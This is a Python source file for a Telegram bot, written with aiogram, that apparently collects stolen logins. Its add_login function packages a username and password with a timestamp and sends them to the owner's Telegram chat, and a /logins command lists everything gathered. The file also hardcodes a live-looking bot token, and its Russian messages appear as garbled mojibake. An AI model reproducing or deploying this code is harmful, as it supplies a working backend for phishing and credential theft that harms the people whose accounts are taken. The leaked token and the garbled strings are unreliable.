from aiogram import Bot, Dispatcher, types
from aiogram.types import Message
from aiogram.filters import Command
from aiogram.enums.parse_mode import ParseMode
from aiogram.fsm.storage.memory import MemoryStorage
from aiogram.client.default import DefaultBotProperties
from datetime import datetime
import asyncio

API_TOKEN = '7858083760:AAHPAfQXOWnkphIEDFOQbCPetuJCta9Jdx4'
OWNER_ID = 1686153131

bot = Bot(
    token=API_TOKEN,
    default=DefaultBotProperties(parse_mode=ParseMode.HTML)
)
dp = Dispatcher(storage=MemoryStorage())


logins = []  # —Å–ø–∏—Å–æ–∫ –ª–æ–≥–∏–Ω–æ–≤ (–≤ –ø–∞–º—è—Ç–∏)

@dp.message(Command("start"))
async def cmd_start(message: Message):
    if message.from_user.id == OWNER_ID:
        await message.answer("‚úÖ –ë–æ—Ç –∑–∞–ø—É—â–µ–Ω. –ñ–¥—É –ª–æ–≥–∏–Ω—ã.")
    else:
        await message.answer("‚ùå –£ —Ç–µ–±—è –Ω–µ—Ç –¥–æ—Å—Ç—É–ø–∞.")

@dp.message(Command("logins"))
async def cmd_logins(message: Message):
    if message.from_user.id != OWNER_ID:
        return
    if not logins:
        await message.answer("üì≠ –ü–æ–∫–∞ –ª–æ–≥–∏–Ω–æ–≤ –Ω–µ—Ç.")
    else:
        text = "üóÇ <b>–°–ø–∏—Å–æ–∫ –ª–æ–≥–∏–Ω–æ–≤:</b>\n\n" + "\n\n".join(logins)
        await message.answer(text)

async def add_login(username, password):
    now = datetime.now().strftime("%d.%m.%Y %H:%M")
    msg = (
        f"<b>üîê –ù–æ–≤—ã–π –ª–æ–≥–∏–Ω</b>\n"
        f"üë§ <b>–õ–æ–≥–∏–Ω:</b> {username}\n"
        f"üîë <b>–ü–∞—Ä–æ–ª—å:</b> {password}\n"
        f"üìÖ <b>–í—Ä–µ–º—è:</b> {now}"
    )
    logins.append(msg)
    await bot.send_message(chat_id=OWNER_ID, text=msg)

async def main():
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
